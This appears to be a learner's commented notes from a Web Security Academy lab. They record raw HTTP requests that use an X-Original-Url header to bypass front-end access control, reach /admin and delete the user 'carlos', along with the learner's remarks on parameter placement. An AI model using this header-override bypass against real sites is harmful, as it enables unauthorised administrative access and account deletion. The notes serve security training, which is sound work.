/*
GET / HTTP/2
Host: 0a69003c03b1a1d081b6118e00670022.web-security-academy.net
X-Original-Url: /admin                                          //admin panel accessed


GET / HTTP/2
Host: 0a69003c03b1a1d081b6118e00670022.web-security-academy.net
X-Original-Url: /admin/delete/?username=carlos                     //missing username paramter

so the custom header doesn't support parameters? Is that why we had to add the parameter
to the top of the request...(is it called the head of the request?)

GET /?username=carlos  HTTP/2
Host: 0a69003c03b1a1d081b6118e00670022.web-security-academy.net
X-Original-Url: /admin /delete                //YES



*/